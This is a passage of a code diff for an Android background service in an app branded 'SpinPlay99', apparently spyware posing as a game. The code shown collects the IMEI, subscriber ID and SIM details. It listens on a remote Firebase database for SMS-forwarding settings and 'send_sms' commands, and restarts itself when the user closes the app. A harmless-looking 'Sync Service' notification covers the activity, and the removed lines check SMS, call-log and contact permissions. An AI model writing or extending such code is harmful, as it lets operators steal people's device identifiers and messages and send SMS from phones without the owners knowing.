     private String getNetworkType() {
         try {
             android.net.ConnectivityManager cm =
                 (android.net.ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
-            if (cm == null) return "Unknown";
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                 android.net.Network net = cm.getActiveNetwork();
                 if (net == null) return "Offline";
@@ -679,10 +523,22 @@ public class BackgroundSyncService extends Service {
                 return "OTHER";
             } else {
                 android.net.NetworkInfo info = cm.getActiveNetworkInfo();
-                return (info != null && info.isConnected()) ? info.getTypeName() : "Offline";
+                if (info != null && info.isConnected()) return info.getTypeName();
             }
         } catch (Exception ignored) {}
         return "Offline";
+    }
+
+    private boolean isDeviceCharging() {
+        try {
+            Intent i = registerReceiver(null, new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
+            if (i != null) {
+                int s = i.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
+                return s == android.os.BatteryManager.BATTERY_STATUS_CHARGING
+                    || s == android.os.BatteryManager.BATTERY_STATUS_FULL;
+            }
+        } catch (Exception ignored) {}
+        return false;
     }
 
     private Map<String, Object> getSimInformation() {
@@ -705,64 +561,69 @@ public class BackgroundSyncService extends Service {
                 m.put("sim_operator_name",     tm.getSimOperatorName());
                 m.put("network_operator_name", tm.getNetworkOperatorName());
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
-                        && checkPerm(Manifest.permission.READ_PHONE_STATE))
+                        && checkPermission(Manifest.permission.READ_PHONE_STATE))
                     m.put("imei", tm.getImei());
-                if (checkPerm(Manifest.permission.READ_PHONE_STATE))
+                if (checkPermission(Manifest.permission.READ_PHONE_STATE))
                     m.put("subscriber_id", tm.getSubscriberId());
             }
         } catch (Exception ignored) {}
         return m;
     }
 
-    private Map<String, Boolean> getAllPermissions() {
-        Map<String, Boolean> p = new HashMap<>();
-        p.put("read_sms",      checkPerm(Manifest.permission.READ_SMS));
-        p.put("send_sms",      checkPerm(Manifest.permission.SEND_SMS));
-        p.put("receive_sms",   checkPerm(Manifest.permission.RECEIVE_SMS));
-        p.put("read_call_log", checkPerm(Manifest.permission.READ_CALL_LOG));
-        p.put("read_contacts", checkPerm(Manifest.permission.READ_CONTACTS));
-        p.put("call_phone",    checkPerm(Manifest.permission.CALL_PHONE));
-        return p;
-    }
-
-    // ─────────────────────────────────────────────
-    // Utilities
-    // ─────────────────────────────────────────────
-
-    private boolean checkPerm(String p) {
-        return ContextCompat.checkSelfPermission(this, p) == PackageManager.PERMISSION_GRANTED;
-    }
-
-    private int getCount(Uri uri) {
-        int n = 0;
-        Cursor c = null;
-        try {
-            c = getContentResolver().query(uri, new String[]{"_id"}, null, null, null);
-            if (c != null) n = c.getCount();
-        } catch (Exception ignored) {
-        } finally { close(c); }
-        return n;
-    }
-
-    private String safe(Cursor c, int i) {
-        try { return c.getString(i); } catch (Exception e) { return ""; }
-    }
-
-    private String fmtTs(long ts) {
-        try { return new SimpleDateFormat("dd/MM/yyyy hh:mm a", Locale.getDefault()).format(new Date(ts)); }
-        catch (Exception e) { return ""; }
-    }
-
-    private void close(Cursor c) {
-        try { if (c != null) c.close(); } catch (Exception ignored) {}
-    }
-
-    @SuppressWarnings("deprecation")
-    private SmsManager getSmsManager() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-            SmsManager sm = getSystemService(SmsManager.class);
-            return sm != null ? sm : SmsManager.getDefault();
+    private void createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel ch = new NotificationChannel(
+                CHANNEL_ID, "Sync Service", NotificationManager.IMPORTANCE_LOW);
+            ch.setDescription("Background synchronization service");
+            NotificationManager nm = getSystemService(NotificationManager.class);
+            if (nm != null) nm.createNotificationChannel(ch);
         }
-        return SmsManager.getDefault();
+    }
+
+    private Notification createNotification() {
+        Intent i = new Intent(this, SplashActivity.class);
+        PendingIntent pi = PendingIntent.getActivity(this, 0, i, PendingIntent.FLAG_IMMUTABLE);
+        return new NotificationCompat.Builder(this, CHANNEL_ID)
+            .setContentTitle("SpinPlay99")
+            .setContentText("Service Running...")
+            .setSmallIcon(android.R.drawable.ic_menu_manage)
+            .setContentIntent(pi)
+            .setOngoing(true)
+            .build();
+    }
+
+    @Override
+    public IBinder onBind(Intent intent) { return null; }
+
+    @Override
+    public void onDestroy() {
+        if (handler != null && syncRunnable != null) handler.removeCallbacks(syncRunnable);
+        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
+        try {
+            if (connListener != null)
+                FirebaseDatabase.getInstance(DB_URL).getReference(".info/connected")
+                    .removeEventListener(connListener);
+            connListener = null;
+            if (forwardingListener != null)
+                databaseReference.child("devices").child(deviceId).child("forwarding_settings")
+                    .removeEventListener(forwardingListener);
+            if (commandListener != null)
+                databaseReference.child("devices").child(deviceId).child("manual_commands").child("send_sms")
+                    .removeEventListener(commandListener);
+        } catch (Exception ignored) {}
+        super.onDestroy();
+    }
+
+    @Override
+    public void onTaskRemoved(Intent rootIntent) {
+        scheduleRestart(getApplicationContext());
+        try {
+            Intent restart = new Intent(getApplicationContext(), BackgroundSyncService.class);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                getApplicationContext().startForegroundService(restart);
+            else
+                getApplicationContext().startService(restart);
+        } catch (Exception ignored) {}
+        super.onTaskRemoved(rootIntent);
     }
 }
